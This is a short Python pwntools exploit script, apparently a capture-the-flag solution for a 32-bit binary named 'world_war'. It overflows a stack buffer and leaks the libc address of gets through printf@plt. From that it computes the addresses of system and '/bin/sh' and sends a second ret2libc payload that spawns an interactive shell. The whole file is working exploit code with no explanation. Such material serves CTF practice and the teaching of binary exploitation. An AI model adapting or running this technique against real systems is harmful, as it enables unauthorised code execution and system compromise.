from pwn import *

def exploit():
    binary = ELF("world_war")
    #p = remote("127.0.0.1", 8888)
    p = process("./world_war")
    hailibc = ELF("libc6_2.23-0ubuntu10_i386.so")     

    padding = 72
    printf_plt = p32(binary.symbols["plt.printf"])
    gets_got = p32(binary.symbols["got.gets"])
    main = p32(binary.symbols["main"])
    
    payload = "A" * padding
    payload += printf_plt
    payload += main
    payload += gets_got
    
    p.sendline(payload)
    p.recvuntil("-->We've got some Allies!\n")

    libc = u32(p.recv(4))
    log.info("Libc gets : {}".format(hex(libc)))
    base_libc = libc - hailibc.symbols["gets"]
    log.info("Libc base : {}".format(hex(base_libc)))
    system_libc = base_libc + hailibc.symbols["system"]
    log.info("Libc system : {}".format(hex(system_libc)))
    binsh_libc = base_libc + hailibc.search("/bin/sh").next()
    log.info("Libc binsh: {}".format(hex(binsh_libc)))
    
    payload = ""
    payload += "A" * padding
    payload += p32(system_libc)
    payload += "JUNK"
    payload += p32(binsh_libc)
    
    p.sendline(payload)
    p.interactive()

if __name__ == "__main__":
    exploit()
